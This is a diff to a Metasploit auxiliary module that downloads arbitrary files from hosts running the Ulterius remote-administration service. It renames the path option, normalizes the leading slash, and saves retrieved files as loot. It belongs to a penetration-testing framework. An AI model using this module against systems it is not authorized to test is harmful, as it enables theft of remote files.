@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
       register_options(
         [
           Opt::RPORT(22006),
-          OptString.new('TARGETURI', [true, 'Path to the file to download', '/.../fileIndex.db']),
+          OptString.new('PATH', [true, 'Path to the file to download', '/.../fileIndex.db']),
         ])
   end
 
@@ -73,9 +73,16 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    path = datastore['PATH']
+    # Always make sure there is a starting slash so as an user,
+    # we don't need to worry about it.
+    path = "/#{path}" if path && path[0] != '/'
+
+    print_status("Requesting: #{path}")
+
     begin
       res = send_request_cgi({
-        'uri' => normalize_uri(target_uri.path),
+        'uri' => normalize_uri(path),
         'method' => 'GET'
       })
     rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
@@ -83,14 +90,15 @@ class MetasploitModule < Msf::Auxiliary
       vprint_error("Failed: #{e.class} - #{e.message}")
       return
     end
+
     if res && res.code == 200
-      if target_uri.path =~ /fileIndex\.db/i
+      if path =~ /fileIndex\.db/i
         inflate_parse(res.body)
       else
-        print_status(target_uri.path)
-        myloot = store_loot('ulterius.file.download', 'text/plain', datastore['RHOST'], res.body, target_uri.path, 'Remote file system')
+        myloot = store_loot('ulterius.file.download', 'text/plain', datastore['RHOST'], res.body, path, 'Remote file system')
         print_status("File contents saved: #{myloot.to_s}")
       end
     end
   end
+
 end
